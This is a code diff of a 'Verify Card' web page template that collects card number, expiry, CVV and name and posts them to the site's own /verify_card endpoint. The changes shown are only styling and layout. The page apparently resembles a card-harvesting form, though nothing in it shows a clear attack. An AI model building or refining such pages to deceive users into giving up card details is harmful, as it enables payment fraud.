@@ -6,8 +6,8 @@
     <title>Verify Card</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: #0b0e1a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .card-box { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); padding: 40px 30px; border-radius: 30px; max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
+        body { background: #0b0e1a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; overflow-x: hidden; }
+        .card-box { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); padding: 40px 30px; border-radius: 30px; max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 20px 60px rgba(0,0,0,0.6); position: relative; z-index: 1; }
         .card-box h2 { text-align: center; margin-bottom: 10px; background: linear-gradient(135deg, #00f0ff, #7a2be0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .card-box .sub { text-align: center; color: #aaa; font-size: 14px; margin-bottom: 25px; }
         .card-preview { background: linear-gradient(145deg, #1a1f2f, #0d111f); border-radius: 20px; padding: 20px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.06); }
@@ -26,16 +26,16 @@
     </style>
 </head>
 <body>
+
+{% include 'earth-bg.html' %}
+
 <div class="card-box">
     <h2>💳 Verify Card</h2>
     <div class="sub">Enter your card details to continue</div>
     <div class="card-preview">
         <div class="chip">💳</div>
         <div class="number" id="displayNumber">7653 0584 4340 2005</div>
-        <div class="details">
-            <span id="displayName">MRX BUDDY</span>
-            <span id="displayExpiry">20/05</span>
-        </div>
+        <div class="details"><span id="displayName">MRX BUDDY</span><span id="displayExpiry">20/05</span></div>
     </div>
     <form id="verifyForm">
         <div class="form-group"><label>Card Number</label><input type="text" id="cardNum" placeholder="7653 0584 4340 2005" maxlength="19"></div>
@@ -46,6 +46,7 @@
     </form>
     <div id="msg" class="msg"></div>
 </div>
+
 <script>
 document.getElementById('verifyForm').addEventListener('submit', async function(e) {
     e.preventDefault();
@@ -54,7 +55,6 @@ document.getElementById('verifyForm').addEventListener('submit', async function(
     const cvv = document.getElementById('cvv').value.trim();
     const name = document.getElementById('cardName').value.trim();
     const msg = document.getElementById('msg');
-
     const res = await fetch('/verify_card', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -70,7 +70,6 @@ document.getElementById('verifyForm').addEventListener('submit', async function(
         msg.textContent = '❌ Invalid card details. Please try again.';
     }
 });
-
 document.getElementById('cardNum').addEventListener('input', function() {
     let val = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
     this.value = val;
